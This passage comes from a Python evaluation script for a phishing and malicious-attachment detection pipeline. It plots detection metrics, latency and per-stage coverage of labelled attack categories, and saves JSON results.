        ax.text(angle, val + 0.07, f"{val:.0%}", ha=ha, va="center",
                fontsize=12, fontweight="bold", color="#222")

    ax.set_thetagrids(np.degrees(angles[:-1]), labels, fontsize=11, fontweight="600")
    ax.set_ylim(0, 1.15)
    ax.set_yticks([0.25, 0.50, 0.75, 1.00])
    ax.set_yticklabels(["25%", "50%", "75%", "100%"], fontsize=8, color="#888")
    ax.set_title("Pipeline Performance Radar", fontsize=15, fontweight="bold", pad=24)
    ax.grid(color="#ccc", linewidth=0.6)

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Radar chart -> {output_path}")


def plot_verdict_pie(y_true: list[str], y_pred: list[str], output_path: Path):
    """Donut chart showing TP / TN / FP / FN distribution."""
    cm = confusion_matrix(y_true, y_pred, labels=["benign", "malicious"])
    tn, fp, fn, tp = cm[0][0], cm[0][1], cm[1][0], cm[1][1]

    sizes = [tp, tn, fp, fn]
    labels_list = [
        f"TP: {tp}\n(malicious caught)",
        f"TN: {tn}\n(benign passed)",
        f"FP: {fp}\n(false alarm)",
        f"FN: {fn}\n(MISSED)",
    ]
    colors = ["#e74c3c", "#2ecc71", "#e67e22", "#f39c12"]
    explode = (0.03, 0.03, 0.06, 0.10)

    fig, ax = plt.subplots(figsize=(7, 7))
    wedges, texts, autotexts = ax.pie(
        sizes, labels=labels_list, colors=colors, explode=explode,
        autopct=lambda p: f"{p:.0f}%" if p > 0 else "",
        startangle=90, pctdistance=0.78,
        wedgeprops=dict(width=0.45, edgecolor="#222", linewidth=1.2),
        textprops=dict(fontsize=10),
    )
    for at in autotexts:
        at.set_fontsize(13)
        at.set_fontweight("bold")
        at.set_color("white")

    ax.set_title("Verdict Distribution", fontsize=15, fontweight="bold", pad=16)
    # Center label
    ax.text(0, 0, f"{sum(sizes)}\ntotal", ha="center", va="center",
            fontsize=18, fontweight="bold", color="#333")

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Verdict pie chart -> {output_path}")


def plot_attack_vector_coverage(results: list[dict], output_path: Path):
    """Grouped bar chart: which pipeline stage detected each attack vector category."""
    malicious = [r for r in results if r["case"]["expected"] == "malicious"]
    if not malicious:
        return

    # Categorise attack types
    categories = {
        "Macro / OLE": ["OLE_VBA_macro_doc"],
        "PDF exploit": ["PDF_javascript_launch"],
        "Type mismatch": ["PE_as_PDF_type_mismatch", "double_extension_screensaver"],
        "Encrypted + pwd": ["encrypted_zip_password_in_body"],
        "Template inject": ["OOXML_remote_template"],
        "HTML smuggling": ["HTML_smuggling"],
        "SVG / script": ["SVG_embedded_script"],
        "Container / LNK": ["ISO_with_LNK_payload"],
        "Polyglot": ["polyglot_PDF_JAR"],
        "Social eng.": ["spear_phish_credential_harvest", "CEO_wire_fraud"],
    }

    stage_names = ["Auth", "Rules", "Extraction", "LLM"]
    cat_labels = []
    stage_data = {s: [] for s in stage_names}

    for cat, case_names in categories.items():
        cat_results = [r for r in malicious if r["case"]["name"] in case_names]
        if not cat_results:
            continue
        cat_labels.append(cat)
        for si, skey in enumerate(["auth", "rules", "extraction", "llm"]):
            detected = 0
            for r in cat_results:
                s = r["result"]["stages"].get(skey, {})
                if skey == "auth" and s.get("failed"):
                    detected = 1
                elif skey == "rules" and s.get("flags", 0) > 0:
                    detected = 1
                elif skey == "extraction" and (s.get("total_flags", 0) > 0 or s.get("escalate")):
                    detected = 1
                elif skey == "llm" and s.get("verdict") == "escalated":
                    detected = 1
            stage_data[stage_names[si]].append(detected)

    x = np.arange(len(cat_labels))
    width = 0.20
    stage_colors = {"Auth": "#9b59b6", "Rules": "#3498db", "Extraction": "#e74c3c", "LLM": "#f39c12"}

    fig, ax = plt.subplots(figsize=(14, 6))
    for i, stage in enumerate(stage_names):
        offset = (i - 1.5) * width
        bars = ax.bar(x + offset, stage_data[stage], width, label=stage,
                      color=stage_colors[stage], edgecolor="#222", linewidth=0.8, alpha=0.85)

    ax.set_xticks(x)
    ax.set_xticklabels(cat_labels, fontsize=10, rotation=25, ha="right")
    ax.set_yticks([0, 1])
    ax.set_yticklabels(["Not detected", "Detected"], fontsize=10)
    ax.set_title("Attack Vector Detection by Pipeline Stage", fontsize=15, fontweight="bold", pad=12)
    ax.legend(fontsize=10, loc="upper right")
    ax.spines["top"].set_visible(False)
    ax.spines["right"].set_visible(False)

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Attack vector coverage -> {output_path}")


def plot_latency(results: list[dict], output_path: Path):
    """Box + strip plot of per-case processing latency, split by class."""
    mal_times = [r["elapsed"] for r in results if r["case"]["expected"] == "malicious"]
    ben_times = [r["elapsed"] for r in results if r["case"]["expected"] == "benign"]

    fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(12, 5), gridspec_kw={"width_ratios": [1, 2]})

    # Box plot
    bp = ax1.boxplot([ben_times, mal_times], labels=["Benign", "Malicious"],
                     patch_artist=True, widths=0.5,
                     boxprops=dict(linewidth=1.2),
                     medianprops=dict(color="#222", linewidth=2))
    bp["boxes"][0].set_facecolor("#2ecc71")
    bp["boxes"][0].set_alpha(0.5)
    bp["boxes"][1].set_facecolor("#e74c3c")
    bp["boxes"][1].set_alpha(0.5)
    ax1.set_ylabel("Seconds", fontsize=11)
    ax1.set_title("Latency Distribution", fontsize=13, fontweight="bold")
    ax1.spines["top"].set_visible(False)
    ax1.spines["right"].set_visible(False)

    # Per-case horizontal bar
    names = [r["case"]["name"].replace("_", " ")[:25] for r in results]
    times = [r["elapsed"] for r in results]
    colors = ["#e74c3c" if r["case"]["expected"] == "malicious" else "#2ecc71" for r in results]
    y_pos = np.arange(len(names))
    ax2.barh(y_pos, times, color=colors, edgecolor="#222", linewidth=0.6, height=0.7)
    ax2.set_yticks(y_pos)
    ax2.set_yticklabels(names, fontsize=8)
    ax2.set_xlabel("Seconds", fontsize=11)
    ax2.set_title("Per-Case Processing Time", fontsize=13, fontweight="bold")
    ax2.invert_yaxis()
    ax2.spines["top"].set_visible(False)
    ax2.spines["right"].set_visible(False)

    # Annotate times
    for i, t in enumerate(times):
        ax2.text(t + 0.02, i, f"{t:.2f}s", va="center", fontsize=8, color="#555")

    from matplotlib.patches import Patch
    ax2.legend(handles=[Patch(facecolor="#e74c3c", label="Malicious"),
                        Patch(facecolor="#2ecc71", label="Benign")],
               loc="lower right", fontsize=9)

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Latency chart -> {output_path}")


def plot_history_trend(output_path: Path):
    """Line chart showing metrics over time from past accuracy runs.

    Reads all results_*.json files in the output directory and plots
    accuracy/precision/recall/F1 progression.
    """
    json_files = sorted(_OUT_DIR.glob("results_*.json"))
    if len(json_files) < 2:
        print("  [PLOT] Trend chart skipped — need at least 2 historical runs")
        return

    runs = []
    for jf in json_files:
        try:
            data = json.loads(jf.read_text(encoding="utf-8"))
            m = data.get("metrics", {})
            ts = data.get("timestamp", "")
            if m and ts:
                runs.append({
                    "timestamp": ts,
                    "accuracy": m.get("accuracy", 0),
                    "precision": m.get("precision", 0),
                    "recall": m.get("recall", 0),
                    "f1": m.get("f1", 0),
                })
        except Exception:
            continue

    if len(runs) < 2:
        print("  [PLOT] Trend chart skipped — need at least 2 valid runs")
        return

    fig, ax = plt.subplots(figsize=(10, 5))
    x_labels = [r["timestamp"][:8] for r in runs]  # YYYYMMDD
    x = np.arange(len(runs))

    metric_styles = [
        ("accuracy", "Accuracy", "#3498db", "o"),
        ("precision", "Precision", "#e67e22", "s"),
        ("recall", "Recall", "#e74c3c", "^"),
        ("f1", "F1 Score", "#2ecc71", "D"),
    ]

    for key, label, color, marker in metric_styles:
        vals = [r[key] for r in runs]
        ax.plot(x, vals, label=label, color=color, marker=marker, markersize=8,
                linewidth=2, markeredgecolor="#222", markeredgewidth=1)

    ax.set_xticks(x)
    ax.set_xticklabels(x_labels, rotation=45, ha="right", fontsize=9)
    ax.set_ylim(0, 1.08)
    ax.set_ylabel("Score", fontsize=12)
    ax.set_xlabel("Run Date", fontsize=12)
    ax.set_title("Pipeline Accuracy Over Time", fontsize=15, fontweight="bold", pad=12)
    ax.legend(fontsize=10, loc="lower right")
    ax.axhline(y=1.0, color="#555", linestyle="--", linewidth=0.8, alpha=0.4)
    ax.grid(axis="y", alpha=0.3)
    ax.spines["top"].set_visible(False)
    ax.spines["right"].set_visible(False)

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Historical trend -> {output_path}")


# ======================== MAIN ========================

def main():
    parser = argparse.ArgumentParser(description="Pipeline accuracy measurement")
    parser.add_argument("--live", action="store_true", help="Include live IMAP emails as benign set")
    parser.add_argument("--no-llm", action="store_true", help="Skip LLM analysis (faster)")
    parser.add_argument("--live-limit", type=int, default=15, help="Max live emails to fetch")
    args = parser.parse_args()

    run_llm = not args.no_llm

    print("=" * 60)
    print("  ATTIJARI SOC — Pipeline Accuracy Test Suite")
    print("=" * 60)
    print(f"  LLM analysis: {'ON' if run_llm else 'OFF'}")
    print(f"  Live emails: {'YES' if args.live else 'NO'}")
    print()

    # Build test corpus
    cases = build_malicious_cases() + build_benign_cases()
    if args.live:
        print("[LIVE] Fetching live inbox emails...")
        live = load_live_emails(limit=args.live_limit)
        print(f"[LIVE] Loaded {len(live)} live emails")
        cases.extend(live)

    total_malicious = sum(1 for c in cases if c["expected"] == "malicious")
    total_benign = sum(1 for c in cases if c["expected"] == "benign")
    print(f"[CORPUS] {len(cases)} test cases: {total_malicious} malicious, {total_benign} benign\n")

    # Run each case through the pipeline
    all_results = []
    y_true = []
    y_pred = []

    for i, case in enumerate(cases, 1):
        tag = "MAL" if case["expected"] == "malicious" else "BEN"
        safe_desc = case['description'][:60].encode("ascii", "replace").decode("ascii")
        print(f"[{i:02d}/{len(cases)}] [{tag}] {case['name']}: {safe_desc}")

        t0 = time.time()
        result = run_pipeline_isolated(case["eml"], run_llm=run_llm)
        elapsed = time.time() - t0

        predicted = classify_result(result)
        y_true.append(case["expected"])
        y_pred.append(predicted)

        match = "OK" if case["expected"] == predicted else "MISS!"
        print(f"         -> {result['final_status'].upper()} (predicted={predicted}) [{match}] ({elapsed:.1f}s)")
        if match == "MISS!" and case["expected"] == "malicious":
            print(f"         *** FALSE NEGATIVE — malicious email NOT caught ***")

        all_results.append({"case": case, "result": result, "predicted": predicted, "elapsed": elapsed})
        # Remove raw eml bytes from stored results (large)
        case_copy = {k: v for k, v in case.items() if k != "eml"}
        all_results[-1]["case"] = case_copy

    # Compute metrics
    print("\n" + "=" * 60)
    print("  RESULTS")
    print("=" * 60)

    metrics = compute_metrics(y_true, y_pred)

    print(f"\n  Accuracy:   {metrics['accuracy']:.1%}")
    print(f"  Precision:  {metrics['precision']:.1%}  (of emails flagged malicious, how many truly were)")
    print(f"  Recall:     {metrics['recall']:.1%}  (of actual malicious emails, how many did we catch)")
    print(f"  F1 Score:   {metrics['f1']:.1%}")
    print()
    print(metrics["classification_report"])

    cm = metrics["confusion_matrix"]
    print(f"  Confusion Matrix:")
    print(f"                  Predicted")
    print(f"                  Benign  Malicious")
    print(f"  Actual Benign   {cm[0][0]:5d}    {cm[0][1]:5d}   (FP={cm[0][1]})")
    print(f"  Actual Malicious{cm[1][0]:5d}    {cm[1][1]:5d}   (FN={cm[1][0]})")

    if cm[1][0] > 0:
        print(f"\n  *** WARNING: {cm[1][0]} MALICIOUS EMAIL(S) MISSED (FALSE NEGATIVES) ***")
        for r in all_results:
            if r["case"]["expected"] == "malicious" and r["predicted"] == "benign":
                print(f"     - {r['case']['name']}: {r['case']['description']}")
    else:
        print(f"\n  All malicious emails detected (0 false negatives)")

    # Generate plots
    print("\n[PLOTS] Generating visualizations...")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    plot_confusion_matrix(cm, _OUT_DIR / f"confusion_matrix_{timestamp}.png")
    plot_metrics_bar(metrics, _OUT_DIR / f"metrics_{timestamp}.png")
    plot_stage_detection(all_results, _OUT_DIR / f"stage_heatmap_{timestamp}.png")
    plot_per_case_detail(all_results, _OUT_DIR / f"per_case_{timestamp}.png")
    plot_radar(metrics, _OUT_DIR / f"radar_{timestamp}.png")
    plot_verdict_pie(y_true, y_pred, _OUT_DIR / f"verdict_pie_{timestamp}.png")
    plot_attack_vector_coverage(all_results, _OUT_DIR / f"attack_vectors_{timestamp}.png")
    plot_latency(all_results, _OUT_DIR / f"latency_{timestamp}.png")
    plot_history_trend(_OUT_DIR / f"trend_{timestamp}.png")

    # Save raw results as JSON
    json_path = _OUT_DIR / f"results_{timestamp}.json"
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump({
            "timestamp": timestamp,
            "config": {"llm_enabled": run_llm, "live_emails": args.live},
            "corpus": {"total": len(cases), "malicious": total_malicious, "benign": total_benign},
            "metrics": {k: v for k, v in metrics.items() if k != "classification_report"},
            "classification_report": metrics["classification_report"],
            "cases": [
                {
                    "name": r["case"]["name"],
                    "expected": r["case"]["expected"],
                    "predicted": r["predicted"],
                    "final_status": r["result"]["final_status"],
                    "stages": r["result"]["stages"],
                    "elapsed_s": round(r["elapsed"], 2),
                }
                for r in all_results
            ],
        }, f, indent=2, default=str)
    print(f"  [JSON] Full results -> {json_path}")

    print(f"\n  All outputs saved to: {_OUT_DIR}")
    print("=" * 60)

    # Exit with error code if any false negatives
    if cm[1][0] > 0:
        sys.exit(1)


if __name__ == "__main__":
    main()
